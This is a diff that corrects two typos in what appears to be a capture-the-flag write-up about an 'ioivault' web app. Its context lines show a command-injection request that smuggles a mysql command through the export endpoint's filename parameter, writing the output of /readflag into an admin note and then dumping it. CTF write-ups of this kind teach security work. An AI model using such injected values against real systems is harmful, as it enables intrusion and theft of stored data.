@@ -18,7 +18,7 @@ function genPass() {
 }
 ```
 
-Of course $RANDOM deoesn't have enough entropy to be safe to use as a password.
+Of course $RANDOM doesn't have enough entropy to be safe to use as a password.
 ```bash
 while true;do echo $RANDOM;done
 ```
@@ -126,7 +126,7 @@ pop pop
 GET /admin/export?filename=ioivault_dump;mysql -h 127.0.0.1 -uioi_vault -pioi_vault -Dioi_vault -e "update saved_passwords set note='$(/readflag)' where owner='admin';"; HTTP/1.1
 ```
 
-And we just have to use our database dumping as a service (DDaS) for the exfiltration
+And we just have to use our database dumping as a service (DDaaS) for the exfiltration
 ```
 GET /admin/export?filename=ioivault_dump HTTP/1.1
 ```
